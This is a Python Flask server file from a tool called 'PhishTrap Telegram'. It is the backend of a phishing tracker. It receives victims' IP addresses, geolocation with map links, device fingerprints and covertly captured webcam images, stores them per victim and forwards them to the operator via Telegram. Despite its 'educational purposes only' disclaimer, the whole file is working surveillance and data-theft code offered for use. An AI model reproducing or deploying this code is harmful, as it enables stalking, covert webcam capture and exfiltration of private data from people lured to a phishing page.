# =========================================================================================
#
#   PhishTrap Telegram - Flask Web Server
#
#   Created by: Jutt Cyber Tech
#   GitHub: https://github.com/juttcybertech
#
#   Disclaimer: This tool is for educational purposes and authorized security testing only.
#
# =========================================================================================
from flask import Flask, request, jsonify
from flask_cors import CORS
import os
from datetime import datetime
import base64

# --- Import the notification functions from the main bot script ---
# We will define these in a.py
from PhishTrap import send_telegram_message, send_telegram_photo, print_lock, P, Y, G, C, W, RESET

app = Flask(__name__)
CORS(app)

def initialize_client_id():
    """Finds the highest existing client ID in the 'data' directory to prevent resets."""
    base_dir = "data"
    if not os.path.isdir(base_dir):
        return 0
    try:
        # Get all subdirectories that are numbers
        existing_ids = [int(d) for d in os.listdir(base_dir) if os.path.isdir(os.path.join(base_dir, d)) and d.isdigit()]
        if not existing_ids:
            return 0
        return max(existing_ids)
    except (ValueError, TypeError):
        # In case of non-integer directory names or other errors
        return 0

# --- Client Counter and Lock ---
client_id_counter = initialize_client_id()
image_capture_started_clients = set()

@app.route('/receive-ip', methods=['POST'])
def receive_ip():
    """
    Receives device and network info from the client and prints it.
    """
    try:
        data = request.get_json()

        if not data or 'ip' not in data:
            return jsonify({"status": "error", "message": "Malformed request, 'ip' is required."}), 400

        # --- Atomically increment client ID ---
        with print_lock:
            global client_id_counter
            client_id_counter += 1
            current_client_id = client_id_counter
        # --- Extract Network Details ---
        ip_address = data.get('ip', 'Unknown')
        continent = data.get('continent', 'Unknown')
        country = data.get('country', 'Unknown')
        region = data.get('regionName', 'Unknown')
        city = data.get('city', 'Unknown')
        org = data.get('org', 'Unknown')
        isp = data.get('isp', 'Unknown')
        lat = data.get('lat')
        lon = data.get('lon')
        google_maps_url = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}" if lat and lon else "Unknown"

        # --- Extract Device Information ---
        platform = data.get('platform', 'Unknown')
        cpu_cores = data.get('cpuCores', 'Unknown')
        ram = data.get('ram', 'Unknown')
        gpu = data.get('gpu', 'Unknown')
        screen_width = data.get('screenWidth', 'Unknown')
        screen_height = data.get('screenHeight', 'Unknown')
        battery = data.get('battery', 'Unknown')
        user_agent = data.get('userAgent', 'Unknown')

        # --- Print Formatted Output (Thread Safe) ---
        with print_lock:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            # --- Print to Terminal ---
            print(f"\n{P}╔══[ CLIENT #{current_client_id} | {timestamp} ]════════════════╗{RESET}")
            print(f"{P}║ {Y}Device Information {P}               ║{RESET}")
            print(f"{P}╚══════════════════════════════════╝{RESET}")
            print(f"{G}├─ {C}Platform   : {W}{platform}{RESET}")
            print(f"{G}├─ {C}CPU Cores  : {W}{cpu_cores}{RESET}")
            print(f"{G}├─ {C}RAM        : {W}{ram} GB{RESET}")
            print(f"{G}├─ {C}GPU        : {W}{gpu}{RESET}")
            print(f"{G}├─ {C}Resolution : {W}{screen_width}x{screen_height}{RESET}")
            print(f"{G}├─ {C}Battery    : {W}{battery}%{RESET}")
            print(f"{G}└─ {C}Browser    : {W}{user_agent}{RESET}")
            print(f"\n{P}╔══════════════════════════════════╗{RESET}")
            print(f"{P}║ {Y}Network Details {P}                  ║{RESET}")
            print(f"{P}╚══════════════════════════════════╝{RESET}")
            print(f"{G}├─ {C}Public IP  : {W}{ip_address}{RESET}")
            print(f"{G}├─ {C}Continent  : {W}{continent}{RESET}")
            print(f"{G}├─ {C}Country    : {W}{country}{RESET}")
            print(f"{G}├─ {C}Region     : {W}{region}{RESET}")
            print(f"{G}├─ {C}City       : {W}{city}{RESET}")
            print(f"{G}├─ {C}Org        : {W}{org}{RESET}")
            print(f"{G}├─ {C}ISP        : {W}{isp}{RESET}")
            print(f"{G}└─ {C}Google Maps: {W}{google_maps_url}{RESET}\n")

            # --- Save to individual client folder ---
            folder_path = os.path.join("data", str(current_client_id))
            os.makedirs(folder_path, exist_ok=True)
            with open(os.path.join(folder_path, "info.txt"), "w", encoding="utf-8") as f:
                f.write(f"CLIENT #{current_client_id} | {timestamp}\n\n")
                f.write(f"[Device Info]\nPlatform: {platform}\nCPU Cores: {cpu_cores}\nRAM: {ram} GB\nGPU: {gpu}\nResolution: {screen_width}x{screen_height}\nBattery: {battery}%\nBrowser: {user_agent}\n\n")
                f.write(f"[Network Info]\nPublic IP: {ip_address}\nLocation: {city}, {region}, {country}\nISP: {isp}\nMaps: {google_maps_url}\n\n")
                f.write("----------------------------------------------------------------\n")
                f.write("Created By: Jutt Cyber Tech (https://github.com/juttcybertech)\n\n")
                f.write("Disclaimer: This tool is intended for educational purposes and authorized security testing only. ")
                f.write("Its goal is to raise awareness about phishing attacks. The creator is not responsible for any illegal or malicious use.\n")
                f.write("----------------------------------------------------------------\n")

            # --- Format and send message to Telegram ---
            telegram_message = (f"<b>CLIENT #{current_client_id} | {timestamp}</b>\n\n"
                                f"<b><u>Device Information</u></b>\n"
                                f"<b>Platform:</b> {platform}\n<b>CPU Cores:</b> {cpu_cores}\n<b>RAM:</b> {ram} GB\n<b>GPU:</b> {gpu}\n<b>Resolution:</b> {screen_width}x{screen_height}\n<b>Battery:</b> {battery}%\n<b>Browser:</b> {user_agent}\n\n"
                                f"<b><u>Network Details</u></b>\n"
                                f"<b>Public IP:</b> {ip_address}\n<b>Location:</b> {city}, {region}, {country}\n<b>ISP:</b> {isp}\n<b>Maps:</b> <a href='{google_maps_url}'>View on Google Maps</a>")
            send_telegram_message(telegram_message)

        return jsonify({"status": "success", "message": "IP received", "clientID": current_client_id}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": "An internal server error occurred."}), 500

@app.route('/receive-image', methods=['POST'])
def receive_image():
    """
    Receives a webcam image from the client and saves it.
    """
    try:
        data = request.get_json()
        client_id = data.get('clientID')
        image_data = data.get('imageData')

        if not client_id or not image_data:
            return jsonify({"status": "error", "message": "Missing clientID or imageData"}), 400

        image_data = image_data.split(',')[1]
        image_bytes = base64.b64decode(image_data)

        folder_path = os.path.join("data", str(client_id))
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        file_name = f"cam_{timestamp}.jpeg"
        file_path = os.path.join(folder_path, file_name)
        with open(file_path, "wb") as image_file:
            image_file.write(image_bytes)

        with print_lock:
            if client_id not in image_capture_started_clients:
                print(f"\n{P}╔══════════════════════════════════╗{RESET}")
                print(f"{P}║ {Y}Collecting Pictures for Client #{client_id}  {P}║{RESET}")
                print(f"{P}╚══════════════════════════════════╝{RESET}")
                image_capture_started_clients.add(client_id)
            print(f"{G}├─ {C}Saved picture: {W}{file_name}{RESET}")
        
        send_telegram_photo(file_path, caption=f"Client #{client_id} - {file_name}")

        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

def run_server():
    # We will run this in a thread from the main bot script
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)

# This block allows the server to be run directly for testing
if __name__ == '__main__':
    print(f"{G}Starting Flask server directly for testing...{RESET}")
    print(f"{C}Server will be available at http://0.0.0.0:5000{RESET}")
    print(f"{C}Press CTRL+C to stop the server.{RESET}")
    run_server()
